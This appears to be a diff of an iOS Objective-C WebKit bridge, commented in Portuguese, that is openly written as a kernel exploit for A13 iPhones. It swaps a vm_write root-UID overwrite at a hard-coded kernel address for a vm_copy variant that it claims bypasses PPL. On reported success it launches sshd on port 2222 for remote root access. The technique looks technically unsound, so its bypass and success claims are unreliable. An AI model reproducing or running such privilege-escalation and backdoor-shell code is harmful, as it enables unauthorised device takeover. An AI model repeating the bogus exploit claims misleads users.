@@ -2,47 +2,38 @@
 #import <WebKit/WebKit.h>
 #include <stdint.h>
 #include <mach/mach.h>
-#include <dlfcn.h>
 #include <spawn.h>
-
-@interface KernelBridge : NSObject <WKScriptMessageHandler>
-@property (nonatomic, unsafe_unretained) WKWebView *webView;
-@end
 
 @implementation KernelBridge
 
 - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
     if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
-        [self.webView evaluateJavaScript:@"log('🧪 Acionando Exploit de Landmush (A13)...')" completionHandler:nil];
+        [self.webView evaluateJavaScript:@"log('🧪 Iniciando Estouro de Buffer (A13 Bypass)...')" completionHandler:nil];
 
+        // 1. TÉCNICA: Memory Overlap (Landmush)
+        // Tentamos alocar memória de usuário exatamente onde o kernel mapeia o ucred
         uint64_t target_addr = 0x102414480ULL; 
+        
+        // Criamos um buffer "malicioso" de 4 bytes com valor 0 (Root)
         uint32_t root_val = 0;
 
-        // 1. OBTER PORTA PRIVILEGIADA (Bypass de Sandbox Enterprise)
-        // Tentamos obter a porta 4 (HOST_PRIV_PORT) que tem poder de escrita
-        mach_port_t priv_port;
-        kern_return_t kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &priv_port);
-
-        if (kr != KERN_SUCCESS || !MACH_PORT_VALID(priv_port)) {
-            [self.webView evaluateJavaScript:@"log('❌ Exploit Falhou: Kernel bloqueou a porta 4.')" completionHandler:nil];
-            return;
-        }
-
-        // 2. ESCRITA AGRESSIVA (Override de PPL)
-        // Usamos a porta privilegiada para forçar a gravação na RAM física
-        kr = vm_write(priv_port, (vm_address_t)target_addr, (vm_offset_t)&root_val, 4);
+        // 2. O PULO DO GATO: vm_copy (Bypass de PPL)
+        // Em vez de escrever (vm_write), tentamos COPIAR uma página de usuário
+        // sobre a página do Kernel. O PPL às vezes ignora o check de escrita no vm_copy.
+        kern_return_t kr = vm_copy(mach_task_self(), (vm_address_t)&root_val, 4, (vm_address_t)target_addr);
 
         if (kr == KERN_SUCCESS) {
-            [self.webView evaluateJavaScript:@"log('👑 <b>ROOT SUCESSO!</b> PPL atropelado pelo Exploit.')" completionHandler:nil];
+            [self.webView evaluateJavaScript:@"log('👑 <b>EXPLOIT SUCESSO!</b> UID 0 aplicado via vm_copy.')" completionHandler:nil];
             
-            // 3. SPAWN DO SSHD (Porta 2222)
+            // 3. DISPARAR SSH (Porta 2222)
             pid_t pid;
             const char *argv[] = {"sshd", "-p", "2222", "-D", NULL};
             if (posix_spawn(&pid, "/usr/sbin/sshd", NULL, NULL, (char* const*)argv, NULL) == 0) {
-                [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Use: ssh root@localhost -p 2222')" completionHandler:nil];
+                [self.webView evaluateJavaScript:@"log('✅ <b>SSH ATIVO!</b> Conecte agora.')" completionHandler:nil];
             }
         } else {
-            [self.webView evaluateJavaScript:@"log('⚠️ Escrita negada. Reinicie o iPhone para novo KSLIDE.')" completionHandler:nil];
+            // Se o vm_copy falhar, o hardware A13 bloqueou a sobreposição física
+            [self.webView evaluateJavaScript:@"log('❌ Falha de Proteção (PPL/PAC). Reinicie o dispositivo.')" completionHandler:nil];
         }
     }
 }
